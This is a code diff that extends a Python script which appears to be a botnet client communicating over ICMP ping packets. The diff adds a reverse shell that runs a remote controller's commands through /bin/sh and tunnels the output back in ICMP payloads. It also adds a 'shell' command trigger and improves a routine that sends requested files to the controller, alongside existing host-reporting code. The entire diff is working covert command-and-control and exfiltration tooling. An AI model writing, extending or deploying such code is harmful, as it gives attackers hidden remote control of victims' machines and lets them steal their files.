@@ -13,6 +13,144 @@ import signal
 import subprocess as sub
 from ConfigParser import SafeConfigParser
 from scapy.all import *
+import select
+from impacket import ImpactDecoder
+from impacket import ImpactPacket
+
+
+
+def pingshell(dst):
+	#print "[D] Dst: %s" % dst
+	s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
+	s.setblocking(0)
+	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+	print "[*] Socket created"
+	
+	ip = ImpactPacket.IP()
+	ip.set_ip_dst(dst)
+
+	# Create a new ICMP packet of type ECHO
+	icmp = ImpactPacket.ICMP()
+	icmp.set_icmp_type(icmp.ICMP_ECHO)
+	response = "#"
+	print "[D] Response: %s" % response 
+	# Include the command as data inside the ICMP packet
+	icmp.contains(ImpactPacket.Data(response))
+
+	# Calculate its checksum
+	icmp.set_icmp_cksum(0)
+	icmp.auto_checksum = 1
+
+	# Have the IP packet contain the ICMP packet (along with its payload)
+	ip.contains(icmp)
+
+	# Send it to the target host
+	s.sendto(ip.get_packet(), (dst, 0))
+
+	decoder = ImpactDecoder.IPDecoder()
+
+	cmd = ''
+	count = 0
+	while 1:
+		# Wait for incoming replies
+		if s in select.select([ s ], [], [], 15)[0]:
+			print "[*] Packet received from %s" % dst
+			buff = s.recv(4096)
+
+        		if 0 == len(buff):
+           			# Socket remotely closed
+           			s.close()
+           			return
+
+        		# Packet received; decode and display it
+        		ippacket = decoder.decode(buff)
+        		icmppacket = ippacket.child()
+        		# If the packet matches, report it to the user
+        		# Get identifier and sequence number
+        		data = icmppacket.get_data_as_string()
+			if len(data) > 0:
+        			if data != '\n':
+					print "[D] Data: %s" % str(data)
+					if data.split('\n')[0] == 'exit':
+                                		s.close()
+						return
+					# Parse command from standard input
+					try:
+                				shell_proc=sub.Popen(["/bin/sh", "-i"],shell=True,stdin=sub.PIPE,stdout=sub.PIPE,stderr=sub.PIPE)
+        				except Exception, e:
+                				print "[X] ERROR: %s" % str(e)
+					
+					try:
+						response = shell_proc.communicate(data)[0]
+						print "[D] Response: %s" % response
+					except Exception,e:
+						print "[X] Error reading response"
+						response = 'error\n'
+					response = response + '#'
+					print "[D] Response: %s" % response
+				else:
+					response = '#'
+        		
+			if len(response) > 1432:
+				chunks, chunk_size = len(response), len(response)/1432
+				print "[D] Chunks: %s, chunk_size: %s" % (chunks, chunk_size)
+				for i in range(0, chunks, chunk_size):
+					print "[D] Response[%s]: %s" % (i,str(response[i:i+chunk_size]))
+			
+					# Include the command as data inside the ICMP packet
+					icmp.contains(ImpactPacket.Data(str(response[i:i+chunk_size])))
+
+        				# Calculate its checksum
+        				icmp.set_icmp_cksum(0)
+        				icmp.auto_checksum = 1
+
+        				# Have the IP packet contain the ICMP packet (along with its payload)
+        				ip.contains(icmp)
+
+        				# Send it to the target host
+        				s.sendto(ip.get_packet(), (dst, 0))
+					print "[D] Packet sent: %s" % response
+			else:
+				# Include the command as data inside the ICMP packet
+                                icmp.contains(ImpactPacket.Data(response))
+
+                                # Calculate its checksum
+                                icmp.set_icmp_cksum(0)
+                                icmp.auto_checksum = 1
+
+                                # Have the IP packet contain the ICMP packet (along with its payload)
+                                ip.contains(icmp)
+
+                                # Send it to the target host
+                                s.sendto(ip.get_packet(), (dst, 0))
+                                print "[D] Packet sent: %s" % response
+		else:
+			print "[*] Select timeout hit, resending empty prompt"
+			count = count + 1
+			if count == 9:
+				print "[X] Session lost, disconnecting"
+				return
+			ip = ImpactPacket.IP()
+        
+        		ip.set_ip_dst(dst)
+        
+        		# Create a new ICMP packet of type ECHO
+        		icmp = ImpactPacket.ICMP()
+        		icmp.set_icmp_type(icmp.ICMP_ECHO)
+        		prompt = '#'
+        		# Include the command as data inside the ICMP packet
+        		icmp.contains(ImpactPacket.Data(prompt))
+        
+        		# Calculate its checksum
+        		icmp.set_icmp_cksum(0)
+        		icmp.auto_checksum = 1
+        
+        		# Have the IP packet contain the ICMP packet (along with its payload)
+        		ip.contains(icmp)
+        
+        		# Send it to the target host
+        		s.sendto(ip.get_packet(), (dst, 0))
+	print "[*] Socket closed and returning"
 
 
 def getSleep():
@@ -76,7 +214,11 @@ def handler(signum, frame):
 
 def sendFile(filename,botId):
 	print "[*] Sending file: %s" % filename
-	file = open(filename, 'r')
+	try:
+		file = open(filename, 'r')
+	except Exception, e:
+		print "[X] File error: %s" % str(e)
+		return
 	startLine = '(FILE_START) ' + botId + ' ' + str(filename)
 	print "[D] Startline: %s" % startLine
 	packet=IP(dst=sys.argv[1])/ICMP()/startLine
@@ -147,7 +289,13 @@ def processReply(p):
         elif 'get' in response:
 		print "[*] Master says give him %s" % response[4:]
 		botId=getId()
-		sendFile(response[4:], botId) 
+		print "[D] filesSent: %s" % str(filesSent)
+		if response[4:] not in filesSent:
+			sendFile(response[4:], botId)
+			filesSent.append(response[4:])
+		else:
+			print "[*] File already sent...skipping"
+		 
 	elif 'sleep' in response:
 		seconds = response[6:]
                 print "[*] Master says sleep for %s seconds" % (seconds)
@@ -156,8 +304,14 @@ def processReply(p):
 	elif 'id=' in response:
 		print "[*] Checked in...placing id in conf file"
 		setId(response[3:])
+	elif 'shell' in response:
+		print "[*] Master wants shell, master gets shell"
+		time.sleep(10)
+		pingshell(sys.argv[1])
 
 def main(argv):
+	global filesSent
+	filesSent = []
 	if int(active()) != 1:
 		print "[*] Not checked in...checking in now"
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
